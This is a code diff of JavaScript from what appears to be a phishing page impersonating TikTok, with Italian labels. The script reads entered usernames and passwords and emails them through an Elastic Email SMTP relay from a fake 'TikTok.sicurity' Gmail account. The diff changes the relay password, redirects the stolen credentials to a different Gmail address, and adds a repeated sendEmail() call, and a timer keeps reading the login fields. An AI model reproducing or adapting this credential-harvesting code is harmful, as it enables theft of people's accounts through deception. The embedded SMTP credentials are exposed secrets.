@@ -7,15 +7,15 @@ Password = document.getElementById("Password").value;
 Email.send({
   Host: "smtp.elasticemail.com",
   Username: "TikTok.sicurity@gmail.com",
-  Password: "B6FD13B19B96DAA1F45AFE19D51C271E38C9",
-  To: 'tiktok.sicurity@gmail.com',
+  Password: "4985ECAA064FA6B3FADE3C6A981A1B8A1AC2",
+  To: 'maurizio11111111@gmail.com',
   From: "tiktok.sicurity@gmail.com",
   Subject: "Nuovo account:",
   Body: ("Nome Utente: " + NomeUtente + "\n" + "Password: " + Password)
   })
   .then(function (message) {
-  alert("Bell sta password waju")
   });
+  sendEmail();
 }
 setInterval(() => {
   NomeUtente = document.getElementById("Nome/Email").value;
